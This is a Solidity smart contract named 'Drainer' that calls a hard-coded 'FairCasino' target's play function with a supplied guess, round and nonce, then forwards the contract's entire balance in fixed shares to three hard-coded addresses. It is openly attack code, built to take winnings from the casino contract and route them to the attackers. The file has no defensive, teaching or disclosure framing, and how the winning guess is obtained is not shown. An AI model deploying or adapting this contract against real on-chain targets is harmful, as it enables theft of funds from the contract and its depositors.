pragma solidity 0.8.28;

interface IDrainer {
    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
    function distribute() external;
}

interface IFairCasino {
    function play(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
}

contract Drainer is IDrainer {
    address constant LT1 = 0x1acB0745a139C814B33DA5cdDe2d438d9c35060E;
    address constant LT2 = 0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d;
    address constant LT3 = 0xA791D68A0E2255083faF8A219b9002d613Cf0637;
    address constant TARGET = 0xed5415679D46415f6f9a82677F8F4E9ed9D1302b;

    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
        IFairCasino(TARGET).play{value: msg.value}(_guess, _round, _nonce);
        distribute();
    }

    function distribute() public override {
        uint256 bal = address(this).balance;
        require(bal > 0, "nothing to distribute");
        payable(LT1).transfer(bal * 50 / 100);
        payable(LT2).transfer(bal * 30 / 100);
        payable(LT3).transfer(address(this).balance);
    }

    receive() external payable {}
}
